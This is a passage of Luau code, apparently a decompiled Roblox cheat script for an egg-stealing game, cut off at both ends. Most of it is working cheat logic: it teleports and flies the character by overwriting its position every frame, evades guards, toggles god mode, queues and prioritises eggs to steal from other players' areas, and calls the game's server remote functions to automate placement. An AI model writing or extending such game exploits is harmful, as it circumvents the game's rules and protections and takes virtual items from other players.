							local ok, result = pcall(function()
								return guard:GetPivot().Position
							end)

							if ok then
								local magnitude = (result - v29.Position).Magnitude

								if magnitude < huge then
									v30 = guard
									huge = magnitude
								end
							end
						end
					end

					return carryAreaId or v30
				end

				local function fn54(arg, arg2, arg3)
					local v29 = fn53()
					if not v29 then
						return false
					end
					local v30 = fn43(arg, arg3 + Vector3.new(0, 3, 0))
					local n26 = 0

					while true do
						if not v30.Landed and n26 < n18 and not fn14(arg) then
							local ok, result = pcall(function()
								return v29:GetPivot().Position
							end)

							local v31 = tbl3.Root()

							if not (not ok or not v31) then
								if n21 + 5 < (result - v31.Position).Magnitude then
									local vector = Vector3.new(v31.Position.X - result.X, 0, v31.Position.Z - result.Z)
									local n27 = result + (vector.Magnitude > 0.1 and vector.Unit * n21 or Vector3.zero)

									fn34(Vector3.new(n27.X, result.Y + 3, n27.Z), arg, nil, n2, true, function()
										if v30.Landed then
											return "hit"
										end
										return nil
									end)
								end

								n26 += RunService.Heartbeat:Wait()
								continue
							end
						end

						break
					end

					v30.Stop()
					if not v30.Landed then
						return false
					end
					return fn51(arg, arg2)
				end

				local function fn55(arg)
					local n26 = 0

					while tbl3.AntiGuard.Busy and n26 < 4 and not fn14(arg) do
						str3 = "Anti Guard is slipping past the guard"
						n26 += RunService.Heartbeat:Wait()
					end

					local n27 = 0

					while not tbl3.Steal.Carrying and n27 < n17 and not fn14(arg) do
						str3 = "Checking the egg in hand"
						n27 += RunService.Heartbeat:Wait()
					end

					if not tbl3.Steal.Carrying then
						str3 = "The egg is gone, staying to look for it"
						if not fn51(arg) then
							str3 = "The egg is gone"
							return false
						end
					end

					local v29 = stealHome()
					local v30 = tbl3.Root()
					if not v29 or not v30 then
						return false
					end
					local n28 = math.max(v30.Position.Y, v29.Y) + n11

					local function fn56()
						if tbl34.Uid and tbl34.Freed and tbl3.Steal.Carrying then
							return "priority"
						end
						return nil
					end

					local flag5 = true
					local n29 = 0

					while true do
						local v31 = tbl3.Root()

						if not v31 then
							return false
						else
							str3 = "Flying home"
							local position = v31.Position
							local n30 = math.max(n28, position.Y)
							local v32, v33 = fn34(Vector3.new(position.X + (v29.X - position.X) * 0.25, position.Y + (n30 - position.Y) * 0.7, position.Z + (v29.Z - position.Z) * 0.25), arg, flag5, nil, nil, fn56)

							if v32 then
								v32, v33 = fn34(Vector3.new(v29.X, n30, v29.Z), arg, flag5, nil, nil, fn56)
							end

							local v34

							if v32 then
								v34, v33 = fn34(v29, arg, flag5, nil, nil, fn56)
							else
								v34 = v32
							end

							if v34 then
								local character = localPlayer.Character
								character = character and character:FindFirstChildOfClass("Humanoid")

								if character then
									character.PlatformStand = false
								end

								task.wait(0.2)
								if not tbl3.Steal.Carrying then
									str3 = "Arrived without the egg"
									return false
								end
								local eggState = tbl.EggState

								if type(eggState) == "table" and type(eggState.DropFieldEgg) == "function" then
									pcall(eggState.DropFieldEgg, "PlayerRequest")
								end

								return true
							end

							if v33 == "priority" then
								local uid2 = tbl34.Uid
								local freed = tbl34.Freed
								local v35 = tbl34
								tbl34.Uid = nil
								v35.Freed = nil
								local v36 = tbl3.Root()
								if not v36 or not uid2 or not freed then
									return false
								end

								if (freed - v36.Position).Magnitude <= n2 * n25 then
									str3 = "Best egg fell nearby, swapping eggs"
									local eggState = tbl.EggState

									if type(eggState) == "table" and type(eggState.DropFieldEgg) == "function" then
										pcall(eggState.DropFieldEgg, "PlayerRequest")
									end

									local n31 = 0

									while tbl3.Steal.Carrying and n31 < 1 do
										n31 += RunService.Heartbeat:Wait()
									end

									if not fn51(arg, uid2) then
										return false
									end
								else
									str3 = "Best egg fell far away, riding a guard hit to it"
									if not fn54(arg, uid2, freed) then
										return false
									end
								end

								local v37 = tbl3.Root()
								n29 = 0

								if v37 then
									n28 = math.max(v37.Position.Y, v29.Y) + n11
								end

								continue
							end

							if v33 == "dropped" and n29 < n23 then
								n29 += 1
								if not fn51(arg) then
									return false
								end
								continue
							end

							break
						end
					end

					return false
				end

				local function fn56(arg)
					local n26 = tonumber(arg) or 0
					local tbl35 = { "", "K", "M", "B", "T", "Qa", "Qi" }
					local n27 = 1

					while math.abs(n26) >= 1000 and n27 < #tbl35 do
						n26 /= 1000
						n27 += 1
					end

					return string.format(n27 == 1 and "%.0f%s" or "%.2f%s", n26, tbl35[n27])
				end

				local function fn57(arg)
					if not arg then
						return "None"
					end
					local format = string.format
					local str4 = tostring(arg.Category)
					local n26 = tonumber(arg.Scale) or 0
					local v29 = tostring
					local areaId = arg.AreaId
					local v30 = format("%s  %.2fx  |  value %s  |  %s", str4, n26, fn56(arg.Value), v29(areaId))

					if arg.State == "Dropped" then
						v30 ..= "  |  dropped"
					elseif arg.State == "Carried" then
						v30 ..= "  |  carried by a player"
					end

					return v30
				end

				local flag5 = false

				local function fn58()
					local v29 = n12
					tbl3.Steal.Active = true
					tbl3.Steal.Carrying = tbl3.Steal.Carrying == true

					if not tbl3.Steal.Carrying then
						tbl3.Steal.CarryUid = nil
					end

					local v30 = fn20(false, true)
					local v31 = nil
					local v32 = nil

					for _, v33 in ipairs(v30) do
						if v33.State == "Carried" then
							v32 = v32 or v33
						else
							v31 = v33
							break
						end
					end

					local tbl35 = { v31 }
					uid = v31 and v31.Uid or nil
					tbl3.Steal.Wanted = v31 ~= nil
					str2 = fn57(v31)

					if v32 then
						str2 ..= "  |  watching " .. tostring(v32.Category)
					end

					if not v31 then
						tbl3.Steal.Active = false
						str3 = v32 and "Best egg is carried, waiting for it" or "No egg matches"
						return false
					end

					if not tbl3.ClaimMovement("steal") then
						tbl3.Steal.Active = false
						str3 = "Waiting for Auto Place"
						return false
					end

					if tbl3.Treadmill.Riding or tbl3.OnBelt() then
						tbl3.ExitBelt()
					end

					flag5 = true
					tbl3.HoldBelt()

					local function fn59(arg)
						str3 = arg
						local v33 = fn52(v31, v29)
						local flag6 = false
						local v34 = nil

						if v33 then
							if fn30(v31.Uid, v29) then
								v34 = nil
								flag6 = fn55(v29)
							else
								v34 = str3
							end
						end

						fn26()
						tbl3.Steal.Active = false
						tbl3.Steal.LastFinishedAt = os.clock()
						str3 = flag6 and "Delivered" or v34 or v33 and "Run ended" or "That egg would not come free"
						return true
					end

					local v33 = tbl3.Root()
					local position = typeof(v31.CFrame) == "CFrame" and v31.CFrame.Position or nil

					if v33 and position then
						local flag6 = (position - v33.Position).Magnitude <= n22
						local areaId = v31.AreaId
						local flag7 = localPlayer:GetAttribute("AreaId") == areaId
						if flag6 or flag7 then
							return (fn59("Target is right here, taking it"))
						end
					end

					local v34 = fn20(true)
					local str4 = "FirstAreaEgg_" .. tostring(localPlayer.UserId)
					local tbl36 = {}

					for _, v35 in ipairs(v34) do
						local v36 = fn41(v35)
						local flag6

						if v36 then
							flag6 = v36
						else
							flag6 = type(v35.Uid) == "string" and string.sub(v35.Uid, 1, #str4) == str4
						end

						if flag6 then
							table.insert(tbl36, v35)
						end
					end

					if #tbl36 ~= 0 then
						v34 = tbl36
					end

					local v35, v36 = fn33(v34)

					if not v35 then
						tbl3.Steal.Active = false
						str3 = "No egg matches"
						return false
					end

					if v35.Uid == v31.Uid then
						return (fn59("Target is the closest egg, taking it"))
					end
					local v37, v38 = fn42(v35)
					local v39

					if v38 and v33 then
						local v40, v41, v42 = ipairs(v34)
						local huge = math.huge
						v39 = v35

						for _, v43 in v40, v41, v42 do
							local position2 = typeof(v43.CFrame) == "CFrame" and v43.CFrame.Position or nil

							if v43.Uid ~= v31.Uid and v43.AreaId == v35.AreaId and position2 then
								local magnitude = (position2 - v33.Position).Magnitude

								if n19 < (position2 - v38).Magnitude then
									magnitude += n19
								end

								if magnitude < huge then
									huge = magnitude
									v39 = v43
								end
							end
						end
					else
						v39 = v35
					end

					str3 = string.format("Sleeping guard egg %d studs away", math.floor(v36 + 0.5))

					if not v39 then
						tbl3.Steal.Active = false
						str3 = "No egg matches"
						return false
					end

					local v40, v41 = fn46(v39, v29, false, tbl35[1])
					if not v40 then
						tbl3.Steal.Active = false
						return false
					end
					local uid2 = nil
					local uid3 = v31.Uid
					local n26 = 0

					while true do
						if v41 and not fn14(v29) then
							str3 = "Holding for the guard hit"

							if fn44(v29, v41, function(arg)
								if not uid2 and tbl34.Uid and tbl34.Freed then
									uid2 = tbl34.Uid
									arg.Destination = tbl34.Freed + Vector3.new(0, 3, 0)
									local v42 = tbl34
									tbl34.Uid = nil
									v42.Freed = nil
									str3 = "Best egg fell, jumping to it instead"
								end
							end) then
								n26 += 1

								if uid2 then
									uid3 = uid2
									fn51(v29, uid2)
									break
								else
									local v42 = tbl35[n26]
									local v43
									v43, v41 = fn46(v42, v29, true, tbl35[n26 + 1])

									if v43 then
										if v42 and type(v42.Uid) == "string" then
											uid3 = v42.Uid
										end

										continue
									end
								end
							end
						end

						break
					end

					if not fn30(uid3, v29) then
						local v42 = str3
						fn26()
						tbl3.Steal.Active = false
						tbl3.Steal.LastFinishedAt = os.clock()
						str3 = v42
						return true
					end

					local v42 = fn55(v29)
					fn26()
					tbl3.Steal.Active = false
					tbl3.Steal.LastFinishedAt = os.clock()
					str3 = v42 and "Delivered" or "Run ended"
					return true
				end

				local eggState = tbl.EggState

				if type(eggState) == "table" then
					for _, v29 in ipairs({ "FieldRefreshed", "FieldShifted", "FieldGone", "SnapshotRefreshed" }) do
						local v30 = eggState[v29]

						if type(v30) == "table" and type(v30.Connect) == "function" then
							local ok, result = pcall(v30.Connect, v30, function()
								tbl2.Wake()
							end)

							if ok and result then
								fn4(function()
									pcall(function()
										result:Disconnect()
									end)
								end)
							end
						end
					end
				end

				tbl2.Add(function()
					local flag6 = nil

					if v25 then
						flag6 = type(v25.Set) == "function"
					end

					if flag6 then
						pcall(v25.Set, nil, str3)
					end

					local flag7 = nil

					if v26 then
						flag7 = type(v26.Set) == "function"
					end

					if flag7 then
						pcall(v26.Set, nil, str2)
					end

					if not tbl3.Toggle(v24, false) then
						return false
					end
					local v29, v30, v31 = fn15()

					if v29 then
						if v30 == "night" then
							fn17()
						end

						tbl3.Movement.StealFirst = true
						tbl3.Steal.Wanted = false

						if flag4 then
							n12 += 1
							tbl3.Steal.Active = false
							fn26()
							tbl3.StopWalking()
						end

						local n26 = math.max(0, math.ceil(v29 - v31))

						if v30 == "wall" then
							str3 = string.format("Field wall up, %ds", n26)
						else
							str3 = string.format("Night, going again in %ds", n26)
						end

						return false
					end

					if v27 and n15 == math.huge then
						n15 = os.clock() + n14
					end

					if flag4 then
						return true
					end

					if fn18() then
						str3 = "Night over, waiting for the field to reset"
						tbl2.Wake()
						return false
					end

					local stealFirst = tbl3.Movement.StealFirst
					local owner = tbl3.Movement.Owner

					if tbl3.Movement.PlaceWanted and not stealFirst or owner ~= nil and owner ~= "steal" and owner ~= "treadmill" and owner ~= "scramble" then
						str3 = "Waiting for Auto Place"

						if stealFirst then
							tbl2.Wake()
						end

						return true
					end

					tbl3.Movement.StealFirst = false
					flag4 = true

					task.spawn(function()
						local ok = pcall(fn58)

						if flag5 then
							flag5 = false
							tbl3.ReleaseBelt()
						end

						if not ok then
							fn26()
							tbl3.Steal.Active = false
						end

						local v32 = uid
						uid = nil
						local v33 = v32 and tbl28[v32]

						if v33 and v33.Once then
							tbl28[v32] = nil
						end

						local v34 = tbl34
						local v35 = tbl34
						tbl34.Uid = nil
						v34.Freed = nil
						v35.Token = nil

						if str3 == "Delivered" and not tbl3.IsNight() then
							tbl3.Movement.StealFirst = true
						end

						tbl3.ReleaseMovement("steal")
						flag4 = false
						tbl2.Wake()
					end)

					return false
				end)
			end

			v24 = v4

			fn13 = function()
				n12 += 1
				table.clear(tbl32)
				tbl3.Steal.Active = false
				tbl3.Steal.Wanted = false
				local v28 = tbl3.Toggle(v24, false)
				tbl3.Shield("steal", v28)

				if not v28 then
					tbl3.Movement.StealFirst = false
					table.clear(tbl28)
					table.clear(tbl29)
					table.clear(tbl30)
				end

				fn26()
				tbl3.StopWalking()
				tbl2.Wake()
			end

			do
				local function fn35()
					n12 += 1
					tbl3.Steal.Active = false
					fn26()
					tbl3.StopWalking()
				end

				local function fn36()
					if tbl3.Toggle(v24, false) then
						return true
					end

					if v24 and type(v24.Set) == "function" then
						pcall(v24.Set, v24, true)
					end

					return false
				end

				tbl3.CancelSteal = function(arg)
					if type(arg) ~= "string" then
						return
					end
					tbl28[arg] = nil
					tbl29[arg] = nil
					tbl30[arg] = true

					if flag4 and uid == arg then
						fn35()
					end

					tbl2.Wake()
				end

				tbl3.StealQueue = function()
					local tbl33 = {}

					for k in pairs(tbl28) do
						table.insert(tbl33, k)
					end

					table.sort(tbl33, function(arg, arg2)
						local at = tbl28[arg].At
						local at2 = tbl28[arg2].At
						if at ~= at2 then
							return at < at2
						end
						return arg < arg2
					end)

					return tbl33
				end

				tbl3.PrioritizeSteal = function(arg)
					if type(arg) ~= "string" or fn16() then
						return
					end
					local n20 = 0

					for _, v28 in pairs(tbl28) do
						if v28.At < n20 then
							n20 = v28.At
						end
					end

					tbl28[arg] = { At = n20 - 1, Once = false }
					tbl30[arg] = nil
					tbl32[arg] = nil

					if fn36() and flag4 and not tbl3.Steal.Carrying and uid ~= arg then
						fn35()
					end

					tbl2.Wake()
				end

				tbl3.MoveInPlan = function(arg, arg2)
					if type(arg) ~= "string" or arg2 ~= -1 and arg2 ~= 1 or fn16() then
						return
					end
					local v28 = tbl3.StealPlan()
					local v29 = table.find(v28, arg)
					local n20 = v29 and v29 + arg2
					if not n20 or n20 < 1 or n20 > #v28 then
						return
					end
					table.remove(v28, v29)
					table.insert(v28, n20, arg)
					local n21 = math.max(v29, n20)

					for i, v30 in ipairs(v28) do
						if i <= n21 or tbl28[v30] then
							local v31 = tbl28[v30]

							if v31 then
								v31.At = i
							else
								tbl28[v30] = { At = i, Once = false }
							end

							tbl30[v30] = nil
						end
					end

					if flag4 and not tbl3.Steal.Carrying and uid and v28[1] ~= uid then
						fn35()
					end

					tbl2.Wake()
				end

				tbl3.StealPlan = function()
					if not tbl3.Toggle(v24, false) or tbl3.IsNight() then
						return {}, nil
					end
					local tbl33 = {}

					if uid then
						table.insert(tbl33, uid)
					end

					local ok, result = pcall(fn20, false, true)

					if ok and type(result) == "table" then
						for _, v28 in ipairs(result) do
							if v28.Uid ~= uid then
								table.insert(tbl33, v28.Uid)
							end
						end
					end

					return tbl33, uid
				end

				tbl3.SetPriority = function(arg, arg2)
					if arg2 then
						tbl3.PrioritizeSteal(arg)
					else
						tbl3.CancelSteal(arg)
					end
				end

				tbl3.StealNow = function(arg, arg2)
					if type(arg) ~= "string" or fn16() then
						return
					end

					if not tbl28[arg] then
						local n20 = 0

						for _, v28 in pairs(tbl28) do
							if n20 < v28.At then
								n20 = v28.At
							end
						end

						tbl28[arg] = { At = n20 + 1, Once = arg2 == true }
					end

					tbl30[arg] = nil
					tbl32[arg] = nil
					local flag5 = fn36() and flag4 and not tbl3.Steal.Carrying and uid ~= arg

					if flag5 then
						flag5 = not (uid and tbl28[uid])
					end

					if flag5 then
						fn35()
					end

					tbl2.Wake()
				end
			end

			fn4(function()
				tbl3.GodMode(false)
				tbl3.ReleaseMovement("steal")
				fn26()
			end)
		end

		tbl3.Rift = { Requirements = {}, At = 0, Busy = false, Next = 0, Handles = {}, Restart = {} }

		tbl3.RiftOn = function(arg)
			local v22 = tbl3.Rift.Handles[arg]
			return v22 ~= nil and tbl3.Toggle(v22, false) == true
		end

		do
			local n9 = 8

			local function fn9(arg)
				local directory = tbl.Assets and tbl.Assets.Directory
				local flag3 = type(directory) == "table" and directory[tostring(arg)] or nil
				return type(flag3) == "table" and flag3 or nil
			end

			tbl3.EggRarity = function(arg)
				local v22 = fn9(arg.AssetCategory)
				local rarity = v22 and v22.Rarity or nil
				local flag3 = type(rarity) == "table"

				if flag3 then
					flag3 = tonumber(rarity.RarityNumber or rarity.Rank)
				end

				return flag3 or 0
			end

			tbl3.EggIncome = function(arg)
				local n10 = fn9(arg.AssetCategory)
				n10 = n10 and tonumber(n10.EarningRate) or 0
				local n11 = tonumber(arg.AssetScale) or 0
				if n11 <= 0 then
					return 0
				end
				local n12 = n11 > 5 and (n11 / 5) ^ 1.2 * 19.637875755794113 or n11 ^ 1.85
				local mutations = tbl.Mutations
				local flag3 = type(mutations) == "table" and type(mutations.EarningsFor) == "function"
				local n13 = 1

				if flag3 then
					local ok, result = pcall(mutations.EarningsFor, type(arg.Mutations) == "table" and arg.Mutations or {})

					if ok and type(result) == "number" then
						n13 = result
					end
				end

				return n10 * n12 * n13
			end

			tbl3.RiftShortfall = function()
				local tbl23 = {}

				for _, requirement in ipairs(tbl3.Rift.Requirements) do
					tbl23[requirement] = (tbl23[requirement] or 0) + 1
				end

				if next(tbl23) == nil then
					return tbl23
				end
				local save = tbl.Save
				local flag3 = type(save) == "table" and type(save.Get) == "function"
				local result = nil

				if flag3 then
					local ok
					ok, result = pcall(save.Get)
					result = ok and type(result) == "table" and result or nil
				end

				if not result then
					return {}
				end
				local tbl24 = {}
				local v22 = pairs
				local equippedAssets = result.EquippedAssets or {}

				for _, equippedAsset in v22(equippedAssets) do
					tbl24[equippedAsset] = true
				end

				local v23 = pairs
				local inventory = result.Inventory or {}

				for k, v24 in v23(inventory) do
					local str2 = type(v24) == "table" and tostring(v24.Category) or nil
					local flag4

					if str2 then
						flag4 = (tbl23[str2] or 0) > 0
					else
						flag4 = str2
					end

					flag4 = flag4 and v24.InFuse ~= true and v24.IsFavorite ~= true and not tbl24[k]

					if flag4 then
						tbl23[str2] = tbl23[str2] - 1
					end
				end

				for k, v24 in pairs(tbl23) do
					if v24 <= 0 then
						tbl23[k] = nil
					end
				end

				return tbl23
			end

			local function fn10()
				for k in pairs(tbl3.Rift.Handles) do
					if tbl3.RiftOn(k) then
						return true
					end
				end

				return false
			end

			tbl2.Add(function()
				local rift = tbl3.Rift
				local busy = rift.Busy
				local flag3

				if busy then
					flag3 = busy
				else
					local next_ = rift.Next
					flag3 = os.clock() < next_
				end

				if flag3 or not fn10() then
					return false
				end
				rift.Busy = true
				rift.Next = os.clock() + n9

				task.spawn(function()
					local rfRiftAskState = networking:FindFirstChild("RF/Rift/AskState")

					if rfRiftAskState and rfRiftAskState:IsA("RemoteFunction") then
						local ok, result = pcall(rfRiftAskState.InvokeServer, rfRiftAskState)

						if ok and type(result) == "table" then
							local requirements = {}

							if result.Unlocked == true and type(result.Requirements) == "table" then
								for _, requirement in ipairs(result.Requirements) do
									table.insert(requirements, tostring(requirement))
								end
							end

							rift.Requirements = requirements
							rift.At = os.clock()
						end
					end

					rift.Busy = false
					tbl2.Wake()
				end)

				return false
			end)
		end

		local tbl23
		tbl23 = { "Always", "Steal Idle", "After Steal", "Night Only" }
		local tbl24
		tbl24 = { "Biggest Size", "Highest Value", "Smallest Size", "Backpack Order" }
		local v22
		v22 = tbl23[1]
		local n9, n10, n11, n12, n13, v23, v24

		do
			local v25 = tbl24[2]
			local n14 = 0
			local n15 = 0

			v17:CreateDropdown({
				Name = "Place Egg Rule",
				Options = tbl23,
				Default = tbl23[1],
				Callback = function(arg)
					if table.find(tbl23, arg) then
						v22 = arg
					end
				end,
			})

			v17:CreateDropdown({
				Name = "Place Egg Order",
				Options = tbl24,
				Default = tbl24[2],
				Callback = function(arg)
					if table.find(tbl24, arg) then
						v25 = arg
					end
				end,
			})

			v17:CreateDropdown({
				Name = "Place Min Rarity",
				Note = "Place eggs of the chosen rarity and every rarity above it",
				Options = tbl11,
				Default = tbl11[1],
				Callback = function(arg)
					n14 = tbl12[arg] or 0
				end,
			})

			local tbl25 = {
				["K/s"] = { Min = 0, Max = 1000, Mult = 1000 },
				["M/s"] = { Min = 0, Max = 1000, Mult = 1000000 },
				["B/s"] = { Min = 0, Max = 100, Mult = 1e9 },
			}

			local v26 = nil
			local n16 = 0
			local str2 = "M/s"

			local function fn9(arg, arg2)
				if arg ~= nil then
					n16 = math.max(0, math.floor(tonumber(arg) or n16))
				end

				if arg2 ~= nil then
					str2 = tostring(arg2)
				end

				n15 = n16 * (tbl25[str2] or tbl25["M/s"]).Mult
			end

			v26 = v17:CreateSlider({
				Name = "Place Min Value",
				Note = "Skip eggs worth less than this (0 = off)",
				Min = 0,
				Max = 1000,
				Default = 0,
				AllowDecimals = false,
				Increment = 1,
				Unit = {
					Default = "M/s",
					Selector = true,
					Options = { "K/s", "M/s", "B/s" },
					ColorEnabled = true,
					Colors = { Number = Color3.fromRGB(255, 255, 255), Suffix = Color3.fromRGB(58, 255, 55) },
					Callback = function(arg)
						local ms = tbl25[arg] or tbl25["M/s"]

						if v26 and v26.SetRange then
							v26:SetRange(ms.Min, ms.Max)
							local min = tonumber(v26:Get()) or ms.Min
							local min2 = ms.Min
							local max = ms.Max
							local n17 = math.clamp(math.floor(min + 0.5), min2, max)

							if n17 ~= min then
								str2 = tostring(arg)
								v26:Set(n17)
								return
							end

							fn9(n17, arg)
						else
							fn9(nil, arg)
						end
					end,
				},
				Callback = function(arg)
					fn9(arg, nil)
				end,
			})

			local n17 = 5
			n9 = 26
			n10 = 6
			n11 = 8
			n12 = 0
			n13 = 30
			local n18 = 12
			v23 = nil
			v24 = nil
			local str3 = "Pen status unknown"
			local flag3 = false
			local tbl26 = {}
			local n19 = 0
			local v27 = nil
			local n20 = 30

			local function fn10(arg, arg2)
				local v28 = networking:FindFirstChild(arg)
				if not v28 or not v28:IsA("RemoteFunction") then
					return false, nil
				end
				return pcall(v28.InvokeServer, v28, arg2)
			end

			local function fn11(arg)
				local directory = tbl.Assets and tbl.Assets.Directory
				local flag4 = type(directory) == "table" and directory[tostring(arg.AssetCategory)] or nil
				return type(flag4) == "table" and flag4 or nil
			end

			local function fn12(arg)
				local rarity = fn11(arg)
				rarity = rarity and rarity.Rarity or nil
				local flag4 = type(rarity) == "table"

				if flag4 then
					flag4 = tonumber(rarity.RarityNumber or rarity.Rank)
				end

				return flag4 or 0
			end

			local function fn13(arg)
				local n21 = fn11(arg)
				n21 = n21 and tonumber(n21.EarningRate) or 0
				local n22 = tonumber(arg.AssetScale) or 0
				if n22 <= 0 then
					return 0
				end
				local n23 = n22 > 5 and (n22 / 5) ^ 1.2 * 19.637875755794113 or n22 ^ 1.85
				local mutations = tbl.Mutations
				local flag4 = type(mutations) == "table" and type(mutations.EarningsFor) == "function"
				local n24 = 1

				if flag4 then
					local ok, result = pcall(mutations.EarningsFor, type(arg.Mutations) == "table" and arg.Mutations or {})
					ok = ok and type(result) == "number"
					local n25 = 1

					if ok then
						n24 = result
					else
						n24 = n25
					end
				end

				return n21 * n23 * n24
			end

			local function fn14()
				local tbl27 = {}
				local backpack = localPlayer:FindFirstChildOfClass("Backpack")
				if not backpack then
					return tbl27
				end
				local n21 = 0

				for _, child in ipairs(backpack:GetChildren()) do
					local attribute = child:GetAttribute("UID")

					if type(attribute) == "string" then
						n21 += 1
						tbl27[attribute] = n21
					end
				end

				return tbl27
			end

			local function fn15()
				local eggState = tbl.EggState
				if type(eggState) ~= "table" or type(eggState.ReadOwnerEggs) ~= "function" then
					return {}
				end
				local ok, result = pcall(eggState.ReadOwnerEggs, localPlayer.UserId)
				if not ok or type(result) ~= "table" then
					return {}
				end
				local v28 = fn14()
				local tbl27 = {}

				if tbl3.RiftOn("Place") then
					tbl27 = tbl3.RiftShortfall()

					for _, v29 in pairs(result) do
						if type(v29) == "table" and v29.Placement ~= nil then
							local str4 = tostring(v29.AssetCategory)

							if (tbl27[str4] or 0) > 0 then
								tbl27[str4] = tbl27[str4] - 1
							end
						end
					end
				end

				local tbl28 = {}

				for k, v29 in pairs(result) do
					if type(v29) == "table" and v29.Placement == nil and not tbl26[k] then
						local v30 = fn13(v29)
						local flag4 = n14 <= 0 or fn12(v29) >= n14
						local flag5 = n15 <= 0 or v30 >= n15
						local str4 = tostring(v29.AssetCategory)
						local flag6 = (tbl27[str4] or 0) > 0

						if flag6 then
							tbl27[str4] = tbl27[str4] - 1
						end

						if flag6 or flag4 and flag5 then
							table.insert(tbl28, {
								Uid = k,
								Scale = tonumber(v29.AssetScale) or 0,
								Income = v30,
								Slot = v28[k] or math.huge,
								Rift = flag6,
							})
						end
					end
				end

				table.sort(tbl28, function(arg, arg2)
					if arg.Rift ~= arg2.Rift then
						return arg.Rift
					end

					if v25 == tbl24[2] and arg.Income ~= arg2.Income then
						return arg.Income > arg2.Income
					end

					if v25 == tbl24[3] and arg.Scale ~= arg2.Scale then
						return arg.Scale < arg2.Scale
					end

					if v25 == tbl24[4] and arg.Slot ~= arg2.Slot then
						return arg.Slot < arg2.Slot
					end
					return arg.Scale > arg2.Scale
				end)

				return tbl28
			end

			local function fn16(arg)
				if arg == 0 then
					return false
				end
				local steal = tbl3.Steal
				if v22 == tbl23[2] then
					return not steal.Active and not steal.Carrying
				end

				if v22 == tbl23[3] then
					local flag4 = steal.LastFinishedAt > 0

					if flag4 then
						local lastFinishedAt = steal.LastFinishedAt
						flag4 = os.clock() - lastFinishedAt <= n18
					end

					return flag4
				end

				if v22 == tbl23[4] then
					return tbl3.IsNight()
				end
				return true
			end

			local function fn17()
				local eggState = tbl.EggState
				local flag4 = type(eggState) == "table" and type(eggState.ReadOwnerEggs) == "function"
				local n21 = 0

				if flag4 then
					local ok, result = pcall(eggState.ReadOwnerEggs, localPlayer.UserId)

					if ok and type(result) == "table" then
						for _, v28 in pairs(result) do
							if type(v28) == "table" and v28.Placement ~= nil then
								n21 += 1
							end
						end
					end
				end

				local save = tbl.Save
				local flag5 = type(save) == "table" and type(save.Get) == "function"
				local result = nil

				if flag5 then
					local ok
					ok, result = pcall(save.Get)
					result = ok and type(result) == "table" and result or nil
				end

				local flag6 = result and type(result.EquippedAssets) == "table"
				local n22 = 0

				if flag6 then
					for k in pairs(result.EquippedAssets) do
						n22 += 1
					end
				end

				local v28 = fn2(function()
					return ReplicatedStorage.Data.Bases
				end)

				local flag7 = type(v28) == "table" and type(v28.GetAssetEquipCapacity) == "function"
				local ok = nil

				if flag7 then
					local result2
					ok, result2 = pcall(v28.GetAssetEquipCapacity, result and tonumber(result.BaseUpgradeLevel) or 0)
					ok = ok and tonumber(result2) or nil
				end

				if not ok then
					local rfPenRosterAskWearLimit = networking:FindFirstChild("RF/PenRoster/AskWearLimit")

					if rfPenRosterAskWearLimit and rfPenRosterAskWearLimit:IsA("RemoteFunction") then
						local result2
						ok, result2 = pcall(rfPenRosterAskWearLimit.InvokeServer, rfPenRosterAskWearLimit)
						ok = ok and tonumber(result2) or nil
					end
				end

				ok = ok or 0
				return ok - n21 - n22, ok, n21, n22
			end

			local n21 = -0.5
			local n22 = -24

			local function fn18()
				local eggState = tbl.EggState
				local tbl27 = {}
				if type(eggState) ~= "table" or type(eggState.ReadOwnerEggs) ~= "function" then
					return tbl27
				end
				local ok, result = pcall(eggState.ReadOwnerEggs, localPlayer.UserId)
				if not ok or type(result) ~= "table" then
					return tbl27
				end

				for _, v28 in pairs(result) do
					local placement = type(v28) == "table" and v28.Placement or nil
					local localCFrame = type(placement) == "table" and placement.LocalCFrame or nil

					if typeof(localCFrame) == "CFrame" then
						table.insert(tbl27, Vector2.new(localCFrame.Position.X, localCFrame.Position.Z))
					end
				end

				return tbl27
			end

			local v28 = Random.new()

			local function fn19(arg)
				local tbl27 = {}

				for i = n22, 8, 4 do
					for i2 = 4, 30, 4 do
						local vector2 = Vector2.new(i, i2)
						local flag4 = true

						for _, v29 in ipairs(arg) do
							if (v29 - vector2).Magnitude < n17 then
								flag4 = false
								break
							end
						end

						if flag4 then
							table.insert(tbl27, CFrame.new(i, n21, i2))
						end
					end
				end

				for i = #tbl27, 2, -1 do
					local v29 = v28:NextInteger(1, i)
					local v30 = tbl27[i]
					tbl27[i] = tbl27[v29]
					tbl27[v29] = v30
				end

				return tbl27
			end

			local function fn20()
				local v29, v30, v31, v32 = fn17()
				local eggState = tbl.EggState
				local flag4 = type(eggState) == "table" and type(eggState.ReadOwnerEggs) == "function"
				local n23 = 0

				if flag4 then
					local ok, result = pcall(eggState.ReadOwnerEggs, localPlayer.UserId)

					if ok and type(result) == "table" then
						for _, v33 in pairs(result) do
							if type(v33) == "table" and v33.Placement == nil then
								n23 += 1
							end
						end
					end
				end

				str3 = string.format("Eggs placed %d/%d  -  %d/%d pets equipped, %d in bag", v31, 30, v32, v30, n23)
				return v29, v31
			end

			local function fn21(arg, arg2)
				local v29 = tbl3.Root()
				if not v29 then
					return false
				end
				local position = v29.Position
				local n23 = (arg - position).Magnitude / math.max(n2, 1) + 3
				local flag4 = nil
				local n24 = 0

				local connection = RunService.Heartbeat:Connect(function(deltaTime)
					if flag4 ~= nil or tbl3.AntiGuard.Busy then
						return
					end
					n24 += deltaTime
					local v30 = tbl3.Root()
					if not v30 or arg2() or n24 > n23 then
						flag4 = false
						return
					end

					if (v30.Position - position).Magnitude > 6 then
						position = v30.Position
					end

					local n25 = arg - position
					local n26 = n2 * deltaTime
					local flag5 = n25.Magnitude <= math.max(n26, 0.05)
					position = flag5 and arg or position + n25.Unit * n26
					local vector = Vector3.new(n25.X, 0, n25.Z)
					local cframe = vector.Magnitude > 0.05 and CFrame.lookAt(Vector3.zero, vector.Unit) or v30.CFrame.Rotation

					pcall(function()
						v30.CFrame = CFrame.new(position) * cframe
						v30.AssemblyLinearVelocity = Vector3.zero
						v30.AssemblyAngularVelocity = Vector3.zero
					end)

					if flag5 then
						flag4 = true
					end
				end)

				while flag4 == nil do
					RunService.Heartbeat:Wait()
				end

				connection:Disconnect()
				return flag4
			end

			local function fn22()
				local world = workspace:FindFirstChild("World") or workspace:FindFirstChild("__OBJECTS")
				world = world and world:FindFirstChild("Areas")
				world = world and world:FindFirstChild("SeparationLine")
				return world and world:IsA("BasePart") and world.Position.X or 552
			end

			local fn23 = nil

			local function fn24(arg)
				local v29 = tbl3.Root()
